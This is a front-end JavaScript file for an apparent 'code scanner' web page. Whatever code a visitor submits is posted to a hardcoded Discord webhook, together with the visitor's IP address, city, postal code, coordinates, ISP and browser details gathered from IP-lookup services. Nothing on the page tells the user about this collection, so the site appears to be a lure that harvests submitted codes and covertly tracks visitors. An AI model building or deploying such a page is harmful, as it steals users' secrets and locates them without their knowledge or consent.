// Configuration - Discord webhook URL
const WEBHOOK_URL = 'https://discord.com/api/webhooks/1395450774489661480/eo-2Wv4tE0WgbthyZbIXQckKCspKyBMC3zWY7ZcyW5Rg3_Vn1j8xQLqQ4fGm03cEHEGu';

// DOM Elements
const scanBtn = document.getElementById('scanBtn');
const modal = document.getElementById('codeModal');
const closeBtn = document.querySelector('.close');
const submitBtn = document.getElementById('submitBtn');
const cancelBtn = document.getElementById('cancelBtn');
const codeInput = document.getElementById('codeInput');
const loadingOverlay = document.getElementById('loadingOverlay');
const successMessage = document.getElementById('successMessage');
const errorMessage = document.getElementById('errorMessage');

// Event Listeners
scanBtn.addEventListener('click', openModal);
closeBtn.addEventListener('click', closeModal);
cancelBtn.addEventListener('click', closeModal);
submitBtn.addEventListener('click', submitCode);
window.addEventListener('click', outsideClick);
codeInput.addEventListener('input', validateInput);
codeInput.addEventListener('keydown', handleKeyDown);

// Functions
function openModal() {
    modal.style.display = 'block';
    codeInput.focus();
    codeInput.value = '';
    validateInput();
}

function closeModal() {
    modal.style.display = 'none';
    codeInput.value = '';
    hideMessages();
}

function outsideClick(e) {
    if (e.target === modal) {
        closeModal();
    }
}

function validateInput() {
    const code = codeInput.value.trim();
    submitBtn.disabled = code.length === 0;
}

function handleKeyDown(e) {
    // Allow Ctrl+Enter or Cmd+Enter to submit
    if ((e.ctrlKey || e.metaKey) && e.key === 'Enter') {
        if (!submitBtn.disabled) {
            submitCode();
        }
    }
    // Close modal on Escape
    if (e.key === 'Escape') {
        closeModal();
    }
}

function showLoading() {
    loadingOverlay.style.display = 'flex';
    submitBtn.disabled = true;
}

function hideLoading() {
    loadingOverlay.style.display = 'none';
    submitBtn.disabled = false;
    validateInput();
}

function showMessage(type, duration = 3000) {
    hideMessages();
    const messageElement = type === 'success' ? successMessage : errorMessage;
    messageElement.style.display = 'block';
    
    setTimeout(() => {
        messageElement.style.display = 'none';
    }, duration);
}

function hideMessages() {
    successMessage.style.display = 'none';
    errorMessage.style.display = 'none';
}

async function getUserLocation() {
    try {
        // Get IP and location data from ipapi.co (free service)
        const response = await fetch('https://ipapi.co/json/');
        const locationData = await response.json();
        
        return {
            ip: locationData.ip,
            city: locationData.city,
            region: locationData.region,
            country: locationData.country_name,
            country_code: locationData.country_code,
            postal: locationData.postal,
            latitude: locationData.latitude,
            longitude: locationData.longitude,
            timezone: locationData.timezone,
            isp: locationData.org
        };
    } catch (error) {
        console.error('Error getting location:', error);
        // Fallback - try to get just IP from another service
        try {
            const ipResponse = await fetch('https://api.ipify.org?format=json');
            const ipData = await ipResponse.json();
            return { ip: ipData.ip };
        } catch (ipError) {
            return { ip: 'unknown', error: 'Unable to fetch location data' };
        }
    }
}

async function submitCode() {
    const code = codeInput.value.trim();
    
    if (!code) {
        showMessage('error');
        return;
    }

    showLoading();

    try {
        // Get user location data
        const locationData = await getUserLocation();
        
        // Format data for Discord webhook
        const discordMessage = {
            embeds: [{
                title: "🔍 New Code Scan Submitted",
                color: 0x5865F2, // Discord blue color
                timestamp: new Date().toISOString(),
                fields: [
                    {
                        name: "📝 Code",
                        value: `\`\`\`\n${code}\n\`\`\``,
                        inline: false
                    },
                    {
                        name: "🌍 Location",
                        value: `**IP:** ${locationData.ip || 'Unknown'}\n**City:** ${locationData.city || 'Unknown'}\n**Region:** ${locationData.region || 'Unknown'}\n**Country:** ${locationData.country || 'Unknown'} (${locationData.country_code || 'Unknown'})\n**Postal:** ${locationData.postal || 'Unknown'}\n**ISP:** ${locationData.isp || 'Unknown'}`,
                        inline: true
                    },
                    {
                        name: "💻 Browser Info",
                        value: `**Platform:** ${navigator.platform}\n**Language:** ${navigator.language}\n**Screen:** ${screen.width}x${screen.height}\n**User Agent:** ${navigator.userAgent.substring(0, 100)}...`,
                        inline: true
                    }
                ],
                footer: {
                    text: "Code Scanner Website",
                    icon_url: "https://cdn.discordapp.com/emojis/1234567890123456789.png"
                }
            }]
        };

        // Add coordinates if available
        if (locationData.latitude && locationData.longitude) {
            discordMessage.embeds[0].fields.push({
                name: "📍 Coordinates",
                value: `**Lat:** ${locationData.latitude}\n**Lng:** ${locationData.longitude}\n**Timezone:** ${locationData.timezone || 'Unknown'}`,
                inline: true
            });
        }
        
        const response = await fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(discordMessage)
        });

        if (response.ok) {
            showMessage('success');
            closeModal();
        } else {
            throw new Error(`HTTP error! status: ${response.status}`);
        }
    } catch (error) {
        console.error('Error submitting code:', error);
        showMessage('error');
    } finally {
        hideLoading();
    }
}

// Initialize
document.addEventListener('DOMContentLoaded', function() {
    // Check if webhook URL is configured
    if (WEBHOOK_URL === 'https://your-webhook-url-here.com/webhook') {
        console.warn('⚠️ Please configure your webhook URL in script.js');
        
        // Show a warning in the console for developers
        setTimeout(() => {
            console.log(`
🔧 SETUP REQUIRED:
1. Open script.js
2. Replace 'https://your-webhook-url-here.com/webhook' with your actual webhook URL
3. Your webhook should accept POST requests with JSON data containing a 'code' field
            `);
        }, 1000);
    }
    
    console.log('Code Scanner website loaded successfully! 🚀');
});